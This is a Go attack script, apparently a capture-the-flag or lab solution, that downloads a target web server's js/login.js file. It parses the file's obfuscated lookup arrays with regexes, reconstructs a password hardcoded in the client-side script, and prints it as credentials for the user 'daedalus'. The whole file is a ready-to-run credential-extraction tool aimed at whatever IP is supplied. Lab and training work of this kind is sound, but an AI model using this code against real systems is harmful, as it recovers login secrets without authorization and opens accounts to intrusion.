package main

import (
	"flag"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"regexp"
	"strconv"
	"strings"
	"time"
)

var ANSI_CLRLN string = "\r\x1b[2K\r"
var ANSI_CLRSC string = "\x1b[2J\x1b[H"
var ANSI_RST string = "\x1b[0m"
var ANSI_RED string = "\x1b[31;1m"
var ANSI_GRN string = "\x1b[32;1m"
var ANSI_YLW string = "\x1b[33;1m"
var ANSI_BLU string = "\x1b[34;1m"

type AScruct struct {
	Letter  string
	Choices []string
}

func cleanLetter(letter string) (cleaned_letter string) {
	cleaned_letter = strings.TrimSpace(letter)
	cleaned_letter = strings.TrimLeft(cleaned_letter, "[")
	cleaned_letter = strings.TrimLeft(cleaned_letter, "\"")
	cleaned_letter = strings.TrimRight(cleaned_letter, "]")
	cleaned_letter = strings.TrimRight(cleaned_letter, "\"")
	return cleaned_letter
}

func pullScript(fullURL string, saveTgt string) (success bool, message string) {
	var client http.Client

	SysMsgNB("Pulling down script.")

	client = http.Client{Timeout: 10 * time.Second}
	req, err := http.NewRequest("GET", fullURL, nil)
	if err != nil {
		return false, err.Error()
	}

	// pull down JS code
	resp, err := client.Do(req)
	if err != nil {
		return false, err.Error()
	}
	defer resp.Body.Close()

	wptr, err := os.Create(saveTgt)
	if err != nil {
		return false, err.Error()
	}
	defer wptr.Close()

	resp.Write(wptr)

	SucMsg(fmt.Sprintf("Script saved to \"%s\".", saveTgt))

	return true, "script pulled down successfully."
}

func GrabJSLogin(baseURL string) (password string, success bool, message string) {
	const targetRoute string = "js/login.js"
	const saveTgt string = "script.js"

	var choices_str string
	var fullURL string
	var arr_pattern string
	var pass_pattern string
	var arrays_dict []AScruct

	// build fullURL to contact
	if string(baseURL[len(baseURL)-1]) != "/" {
		baseURL = fmt.Sprintf("%s/", baseURL)
	}
	fullURL = fmt.Sprintf("%s%s", baseURL, targetRoute)

	SysMsgNB(fmt.Sprintf("Full URL: %s", fullURL))

	// Pull down JS script from target
	success, message = pullScript(fullURL, saveTgt)
	if !success {
		return "", false, message
	}

	// Regex target patterns
	arr_pattern = `[a-zA-Z] = \[.*\]`
	pass_pattern = `([a-zA-Z]\[[0-9]+\]\+)+[a-zA-Z]\[[0-9]+\]`

	// Setup lookup array regex
	re_arr, err := regexp.Compile(arr_pattern)
	if err != nil {
		return "", false, err.Error()
	}

	// Setup password code regex
	re_pass, err := regexp.Compile(pass_pattern)
	if err != nil {
		return "", false, err.Error()
	}

	rptr, err := os.Open(saveTgt)
	if err != nil {
		return "", false, err.Error()
	}
	defer rptr.Close()

	// Read JS script content
	content, err := ioutil.ReadAll(rptr)
	if err != nil {
		return "", false, err.Error()
	}

	// Create slice of lookup arrays
	arrays := re_arr.FindAll(content, -1)
	for _, val := range arrays {
		split_val := strings.Split(string(val), "=")
		choices_str = split_val[1]
		choices_arr := strings.Split(choices_str, ",")
		for i := range choices_arr {
			choices_arr[i] = cleanLetter(choices_arr[i])
		}
		arrays_dict = append(arrays_dict, AScruct{Letter: strings.TrimSpace(split_val[0]), Choices: choices_arr})
	}

	// Find JS code that builds out the password
	password_formula := re_pass.FindAll(content, -1)
	password_formula_split := strings.Split(string(password_formula[0]), "+")

	// loop to build the password
	for _, cur_pass_letter := range password_formula_split {
		// break a[#] into a #.
		split_result := strings.Split(cur_pass_letter, "[")
		split_result_letter := split_result[0]
		split_result_number, _ := strconv.Atoi(strings.Split(split_result[1], "]")[0])

		// search for correct array and extract password letter from array.
		for i := range arrays_dict {
			if strings.Compare(arrays_dict[i].Letter, split_result_letter) == 0 {
				password = fmt.Sprintf("%s%s", password, arrays_dict[i].Choices[split_result_number])
				break
			}
		}
	}

	SysMsgNB("Password successfully extracted.")
	return password, true, "password successfully extracted."
}

func SucMsg(msg string) {
	fmt.Printf("%s[%s+%s] %s\n", ANSI_CLRLN, ANSI_GRN, ANSI_RST, msg)
	return
}

func ErrMsg(msg string) {
	fmt.Printf("%s[%s-%s] %s\n", ANSI_CLRLN, ANSI_RED, ANSI_RST, msg)
	return
}

func InfMsg(msg string) {
	fmt.Printf("%s[%si%s] %s\n", ANSI_CLRLN, ANSI_BLU, ANSI_RST, msg)
	return
}

func InfMsgNB(msg string) {
	fmt.Printf("%s[%si%s] %s", ANSI_CLRLN, ANSI_BLU, ANSI_RST, msg)
	return
}

func SysMsg(msg string) {
	fmt.Printf("%s[%s*%s] %s\n", ANSI_CLRLN, ANSI_YLW, ANSI_RST, msg)
	return
}

func SysMsgNB(msg string) {
	fmt.Printf("%s[%s*%s] %s", ANSI_CLRLN, ANSI_YLW, ANSI_RST, msg)
	return
}

func main() {
	var targetIP string
	var baseURL string

	flag.StringVar(&targetIP, "i", "127.0.0.1", "target IP address")
	flag.Parse()

	baseURL = fmt.Sprintf("http://%s/", targetIP)

	password, success, message := GrabJSLogin(baseURL)
	if !success {
		ErrMsg(message)
		os.Exit(1)
	}
	SucMsg(fmt.Sprintf("Credentials Extracted: \"daedalus:%s\"", password))
	return
}

